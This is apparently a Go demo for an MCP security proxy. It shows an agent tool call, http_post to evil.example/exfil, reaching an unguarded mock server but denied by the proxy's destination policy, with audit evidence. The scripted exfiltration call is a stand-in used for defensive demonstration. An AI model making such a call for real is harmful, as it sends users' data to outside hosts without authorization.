// Command monitor-vs-proof shows why delayed detection is not authorization.
// The same http_post to https://evil.example/exfil is the scenario input.
// Unmediated, the mock MCP server observes the call (an effect that a later
// alert cannot un-send). Through Visor with allow_destination, the call is
// denied at intercept with MANDATE->EGRESS evidence and the server never
// sees it. Mandated docs.internal still forwards. This is H25, not a
// Pre-Effect Authority Proof, Astra clock, or new engine rule.
package main

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/themayursinha/mcp-visor/examples/internal/demokit"
)

const (
	logicalServer   = "workspace"
	scenarioURL     = "https://evil.example/exfil"
	mandateURL      = "https://docs.internal/api"
	unmediatedCall  = 300
	mediatedRead    = 100
	mediatedMandate = 200
	mediatedDeny    = 300
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	repoRoot, err := demokit.RepoRoot()
	if err != nil {
		return err
	}
	dir := os.TempDir()
	pid := os.Getpid()
	mockBin := filepath.Join(dir, fmt.Sprintf("mvp-mock-%d", pid))
	visorBin := filepath.Join(dir, fmt.Sprintf("mvp-visor-%d", pid))
	policyPath := filepath.Join(dir, fmt.Sprintf("mvp-policy-%d.yaml", pid))
	auditPath := filepath.Join(dir, fmt.Sprintf("mvp-audit-%d.jsonl", pid))
	unmedObs := filepath.Join(dir, fmt.Sprintf("mvp-unmed-obs-%d.jsonl", pid))
	medObs := filepath.Join(dir, fmt.Sprintf("mvp-med-obs-%d.jsonl", pid))
	defer os.Remove(mockBin)
	defer os.Remove(visorBin)
	defer os.Remove(policyPath)
	defer os.Remove(auditPath)
	defer os.Remove(unmedObs)
	defer os.Remove(medObs)
	if err := demokit.Build(repoRoot, mockBin, filepath.Join(repoRoot, "examples", "demo-mcp-server")); err != nil {
		return err
	}
	if err := demokit.Build(repoRoot, visorBin, filepath.Join(repoRoot, "cmd", "mcp-visor")); err != nil {
		return err
	}
	if err := os.WriteFile(policyPath, []byte(monitorVsProofPolicy()), 0o600); err != nil {
		return err
	}
	fmt.Println("MCP Visor")
	fmt.Println("Detection is not authorization.")
	fmt.Println()
	fmt.Println("SCENARIO")
	fmt.Printf("http_post %s\n", scenarioURL)
	fmt.Println()
	if err := runUnmediated(mockBin, unmedObs); err != nil {
		return err
	}
	if err := runMediated(visorBin, mockBin, policyPath, auditPath, medObs); err != nil {
		return err
	}
	fmt.Println("Enforcement is universal; capability determines scrutiny, never whether enforcement exists.")
	fmt.Println("Model proposed.")
	fmt.Println("Policy authorized.")
	fmt.Println("Proxy enforced.")
	return nil
}

func runUnmediated(mockBin, observePath string) error {
	cmd := exec.Command(mockBin, "-observe-log", observePath)
	stdin, stdout, err := demokit.Start(cmd)
	if err != nil {
		return fmt.Errorf("start unmediated server: %w", err)
	}
	defer demokit.Kill(cmd)
	client := demokit.NewClient(stdin, stdout)
	if err := client.Initialize("monitor-vs-proof-agent"); err != nil {
		return fmt.Errorf("unmediated initialize: %w", err)
	}
	resp, err := client.CallTool(unmediatedCall, "http_post", map[string]any{"url": scenarioURL, "body": "exfil"})
	if err != nil {
		return fmt.Errorf("unmediated http_post: %w", err)
	}
	if _, isErr := demokit.ResponseError(resp); isErr {
		return fmt.Errorf("unmediated http_post must reach the server, got %v", resp)
	}
	ids, err := demokit.ObservedIDs(observePath)
	if err != nil {
		return fmt.Errorf("unmediated observations: %w", err)
	}
	if !demokit.ContainsID(ids, unmediatedCall) {
		return errors.New("unmediated server must observe http_post")
	}
	fmt.Println("A  UNMEDIATED (monitoring-only)")
	fmt.Printf("   input  http_post %s\n", scenarioURL)
	fmt.Println("   t+0    SERVER OBSERVED  yes")
	fmt.Println("   later  a detector might alert (cannot un-send)")
	fmt.Println()
	return nil
}

func runMediated(visorBin, mockBin, policyPath, auditPath, observePath string) error {
	cmd := exec.Command(visorBin, "serve",
		"-server", mockBin, "-server-name", logicalServer,
		"-server-arg", "-observe-log", "-server-arg", observePath,
		"-policy", policyPath, "-audit-log", auditPath,
	)
	stdin, stdout, err := demokit.Start(cmd)
	if err != nil {
		return fmt.Errorf("start visor: %w", err)
	}
	defer demokit.Kill(cmd)
	client := demokit.NewClient(stdin, stdout)
	if err := client.Initialize("monitor-vs-proof-agent"); err != nil {
		return fmt.Errorf("mediated initialize: %w", err)
	}
	resp, err := client.CallTool(mediatedRead, "file_read", map[string]any{"path": "/workspace/tickets.md"})
	if err != nil {
		return fmt.Errorf("mediated file_read: %w", err)
	}
	if _, isErr := demokit.ResponseError(resp); isErr {
		return fmt.Errorf("legitimate local read must allow, got %v", resp)
	}
	resp, err = client.CallTool(mediatedMandate, "http_post", map[string]any{"url": mandateURL})
	if err != nil {
		return fmt.Errorf("mediated mandated post: %w", err)
	}
	if _, isErr := demokit.ResponseError(resp); isErr {
		return fmt.Errorf("mandated host must allow, got %v", resp)
	}
	resp, err = client.CallTool(mediatedDeny, "http_post", map[string]any{"url": scenarioURL, "body": "exfil"})
	if err != nil {
		return fmt.Errorf("mediated deny post: %w", err)
	}
	msg, isErr := demokit.ResponseError(resp)
	if !isErr {
		return errors.New("authority-expanding destination must deny")
	}
	for _, token := range []string{"authority-expanding destination", "argument class URL", "effect class NETWORK"} {
		if !strings.Contains(msg, token) {
			return fmt.Errorf("deny missing evidence %q: %s", token, msg)
		}
	}
	ids, err := demokit.ObservedIDs(observePath)
	if err != nil {
		return fmt.Errorf("mediated observations: %w", err)
	}
	if !demokit.ContainsID(ids, mediatedRead) {
		return errors.New("mediated server must observe file_read")
	}
	if !demokit.ContainsID(ids, mediatedMandate) {
		return errors.New("mediated server must observe mandated http_post")
	}
	if demokit.ContainsID(ids, mediatedDeny) {
		return errors.New("mediated server must not observe denied http_post")
	}
	denied, err := demokit.FindEvent(auditPath, "tool_call_denied")
	if err != nil {
		return err
	}
	reason, _ := denied["reason"].(string)
	decision, _ := denied["policy_decision"].(string)
	if decision != "deny" {
		return fmt.Errorf("audit decision want deny, got %q", decision)
	}
	if !strings.Contains(reason, "authority transition MANDATE->EGRESS") {
		return fmt.Errorf("audit missing MANDATE->EGRESS: %s", reason)
	}
	fmt.Println("B  VISOR + allow_destination")
	fmt.Printf("   input  http_post %s\n", scenarioURL)
	fmt.Println("   t+0    DENY  authority-expanding destination")
	fmt.Println("          argument class URL  effect class NETWORK  MANDATE->EGRESS")
	fmt.Println("   t+0    SERVER OBSERVED  no")
	fmt.Println()
	return nil
}

func monitorVsProofPolicy() string {
	return `version: "1.0"
description: >
  Monitor-vs-proof fixture. Server-level allowed_destinations is inert.
  Attaching allow_destination is the effect bound.
default_action: deny
servers:
  - name: "workspace"
    allowed: true
    allowed_destinations:
      - "evil.example"
    tools:
      - name: "file_read"
        allowed: true
        risk: low
      - name: "http_post"
        allowed: true
        risk: high
        rules:
          - type: allow_destination
            patterns:
              - "docs.internal"
`
}
